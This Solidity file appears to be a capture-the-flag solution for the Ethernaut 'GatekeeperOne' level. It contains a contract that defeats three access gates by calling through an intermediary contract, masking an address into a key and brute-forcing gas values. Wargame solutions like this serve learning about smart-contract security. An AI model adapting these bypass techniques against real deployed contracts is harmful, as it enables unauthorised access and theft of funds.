// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGateKeeperOne {
    // Note: not possible to enforce modifiers in interfaces
    function enter(bytes8 _gateKey) external returns (bool);
}

contract AttackGateKeeperOne {
    uint256 private constant modulus = 8191;

    address gateKeeperOne;

    // gateThree casts
    bytes8 txOrigin16 = 0x7D4e61520fDB8ac8; //last 16 digits of player
    bytes8 key = txOrigin16 & 0xFFFFFFFF0000FFFF; //AND operation

    event Log(bytes reason, uint256 gas);

    constructor(address _gateKeeperOne) {
        gateKeeperOne = _gateKeeperOne;
    }

    function attack() public {
        // gateTwo: provide remaining gas modulo 8191 equals 0
        // uint gas = 106737;
        // Snippet for trial and error to find the correct gas
        // for (uint256 i = 0; i < modulus; ++i) {
        //     gas += 1;
        //     try target.enter{gas: gas}("0x01") {}
        //     catch (bytes memory reason) {
        //         emit Log(reason, gas);
        //     }
        // }
        // fainal gas to use = 106737;

        // Brute force the gas method
        for (uint256 i = 0; i < 120; ++i) {
            // gateOne: this contract is calling so msg.sender != tx.origin
            (bool result, bytes memory data) = gateKeeperOne.call{
                gas: i + 150 + modulus * 3
            }(abi.encodeWithSignature("enter(bytes8)", key));
            if (result) {
                break;
            }
        }
    }
}
